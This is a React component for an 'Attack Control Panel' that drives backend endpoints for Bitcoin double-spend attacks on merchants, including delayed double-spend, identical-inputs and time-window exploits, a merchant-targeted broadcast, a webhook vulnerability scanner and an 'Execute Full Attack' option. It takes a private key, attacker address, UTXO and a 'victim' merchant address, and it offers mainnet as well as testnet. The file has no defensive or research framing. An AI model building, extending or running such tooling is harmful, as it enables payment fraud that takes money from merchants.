import React, { useState } from "react";

const endpoints = {
  "final-sequence": "/api/final-sequence-attack",
  "smart-fee": "/api/smart-fee-booster",
  "merchant-broadcast": "/api/merchant-targeted-broadcast",
  "delayed-doublespend": "/api/delayed-doublespend",
  "identical-inputs": "/api/identical-inputs-exploit",
  "time-window": "/api/time-window-exploit",
  "webhook-scanner": "/api/webhook-vulnerability-scanner",
  "full-attack": "/api/execute-full-attack",
};

export default function AttackPanel() {
  const [select, setSelect] = useState("final-sequence");
  const [network, setNetwork] = useState("testnet");
  const [wif, setWIF] = useState("");
  const [utxo, setUTXO] = useState({ txid: "", vout: 0, value: 0 });
  const [merchant, setMerchant] = useState("");
  const [attacker, setAttacker] = useState("");
  const [feerate, setFeerate] = useState(15);
  const [merchantNodes, setMerchantNodes] = useState("");
  const [paymentWindow, setPaymentWindow] = useState(15); // minutes
  const [result, setResult] = useState("");
  const [loading, setLoading] = useState(false);

  async function generateWallet() {
    const res = await fetch("/api/generate-wallet", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ network }),
    });
    const wallet = await res.json();
    setWIF(wallet.wif);
    setAttacker(wallet.recommended_address);
  }

  async function fetchUTXO() {
    const res = await fetch(
      `/api/wallet/utxos?address=${attacker}&network=${network}`
    );
    const data = await res.json();
    if (Array.isArray(data.utxos) && data.utxos[0]) {
      const { txid, vout, value } = data.utxos[0];
      setUTXO({ txid, vout, value });
    }
  }

  async function executeAttack() {
    setLoading(true);
    setResult("");
    let body = {
      wif,
      utxo,
      merchant_address: merchant,
      attacker_address: attacker,
      network,
      fee_rate: feerate,
      merchant_nodes: merchantNodes
        .split("\n")
        .map((x) => x.trim())
        .filter((x) => x),
      merchant_payment_window_minutes: paymentWindow,
    };
    // Adjust for specific endpoints
    if (select === "delayed-doublespend") {
      body = {
        ...body,
        hex: result?.tx_attacker?.hex || "", // Provide the raw tx hex to broadcast
      };
    }
    if (select === "webhook-scanner") {
      body = {
        webhook_url: merchant, // Use merchant field for webhook URL input
      };
    }
    try {
      const res = await fetch(
        window.location.origin + endpoints[select],
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        }
      );
      setResult(await res.text());
    } catch (e) {
      setResult("Error: " + e.message);
    }
    setLoading(false);
  }

  return (
    <div style={{ maxWidth: 580, margin: "auto", background: "#111927", color: "#fff", borderRadius: 14, padding: 32 }}>
      <h2>🚀 Attack Control Panel</h2>
      <div>
        <label>Attack Type: <br />
          <select value={select} onChange={e => setSelect(e.target.value)}>
            <option value="final-sequence">Final Sequence Attack</option>
            <option value="smart-fee">Smart Fee Booster</option>
            <option value="merchant-broadcast">Merchant Targeted Broadcast</option>
            <option value="delayed-doublespend">Delayed Double-Spend</option>
            <option value="identical-inputs">Identical Inputs Exploit</option>
            <option value="time-window">Time Window Exploit</option>
            <option value="webhook-scanner">Webhook Vulnerability Scanner</option>
            <option value="full-attack">Execute Full Attack</option>
          </select>
        </label>
      </div>
      <div>
        <label>Network:</label>{" "}
        <select value={network} onChange={e => setNetwork(e.target.value)}>
          <option value="testnet">Testnet ✓</option>
          <option value="mainnet">Mainnet ⚠️</option>
        </select>
      </div>
      <div style={{ margin: "6px 0 2px" }}>
        <label>WIF (Private Key):</label>
        <textarea
          style={{ width: "100%", fontFamily: "monospace", height: 48 }}
          value={wif}
          onChange={e => setWIF(e.target.value)}
          placeholder="L1aW4aubDFB7yfras2S1m..."
        />
        <button onClick={generateWallet} style={{ marginRight: 6 }}>Generate Wallet</button>
      </div>
      <div>
        <label>Attacker Address:</label>
        <input
          value={attacker}
          onChange={e => setAttacker(e.target.value)}
          style={{ width: "100%", fontFamily: "monospace" }}
          placeholder="bc1q... (from WIF)"
        />
      </div>
      <div>
        <label>UTXO (from attacker address):</label>
        <input
          value={utxo.txid}
          onChange={e => setUTXO({ ...utxo, txid: e.target.value })}
          style={{ width: "100%" }}
          placeholder="TXID"
        /><br />
        <input
          value={utxo.vout}
          type="number"
          onChange={e => setUTXO({ ...utxo, vout: Number(e.target.value) })}
          style={{ width: 80 }}
          placeholder="Vout"
        />
        <input
          value={utxo.value}
          type="number"
          onChange={e => setUTXO({ ...utxo, value: Number(e.target.value) })}
          style={{ width: 160, marginLeft: 10 }}
          placeholder="Value (satoshis)"
        />
        <button onClick={fetchUTXO} style={{ marginLeft: 8 }}>Fetch UTXO</button>
      </div>
      <div>
        <label>Merchant Address:</label>
        <input
          value={merchant}
          onChange={e => setMerchant(e.target.value)}
          style={{ width: "100%", fontFamily: "monospace" }}
          placeholder="bc1q... (victim address)"
        />
      </div>
      <div>
        <label>Fee Rate (sat/vB):</label>
        <input
          value={feerate}
          type="number"
          onChange={e => setFeerate(Number(e.target.value))}
          style={{ width: 120 }}
        />
      </div>
      <div>
        <label>Payment Window (minutes):</label>
        <input
          value={paymentWindow}
          type="number"
          onChange={e => setPaymentWindow(Number(e.target.value))}
          style={{ width: 70 }}
        />
      </div>
      <div>
        <label>Merchant Nodes List (optional):</label>
        <textarea
          value={merchantNodes}
          onChange={e => setMerchantNodes(e.target.value)}
          style={{ width: "100%", fontFamily: "monospace" }}
          placeholder="https://mempool.space/testnet/api/tx"
        />
      </div>
      <div style={{ margin: "8px 0" }}>
        <button onClick={executeAttack} disabled={loading}>
          {loading ? "Executing..." : "🚀 Execute Attack"}
        </button>
        <button onClick={() => setResult("")} style={{ marginLeft: 8 }}>Clear</button>
        <button onClick={() => navigator.clipboard.writeText(result)} style={{ marginLeft: 8 }}>Copy Result</button>
      </div>
      <div>
        {result && (
          <pre style={{ marginTop: 12, background: "#09111F", color: "#0CF", borderRadius: 8, padding: 14, fontSize: 13, maxHeight: 300, overflow: "auto" }}>
            {result}
          </pre>
        )}
      </div>
    </div>
  );
}
